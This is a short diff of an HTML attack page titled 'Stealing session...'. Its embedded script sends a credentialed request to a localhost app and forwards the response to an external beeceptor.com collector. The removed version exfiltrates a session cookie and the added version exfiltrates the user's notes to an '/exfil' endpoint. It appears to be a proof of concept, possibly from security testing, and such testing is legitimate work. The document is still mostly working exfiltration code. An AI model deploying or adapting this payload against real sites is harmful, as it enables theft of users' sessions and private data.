@@ -9,19 +9,20 @@
   <h2>Stealing session...</h2>
   
   <script>
-    fetch("https://localhost/refresh-session", {
-  method: "GET",
-  credentials: "include"
+fetch('https://localhost/get-notes', {
+    method: 'GET',
+    credentials: 'include'
 })
-.then(response => {
-  const cookie = response.headers.get("set-cookie");
-  return fetch("https://fadsf.free.beeceptor.com", {
-    method: "POST",
-    body: JSON.stringify({ stolenCookie: cookie }),
-    headers: { "Content-Type": "application/json" }
-  });
+.then(response => response.json())
+.then(data => {
+    fetch('https://fadsf.free.beeceptor.com/exfil', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ stolenNotes: data.notes })
+    });
 });
-
   </script>
 </body>
 </html>
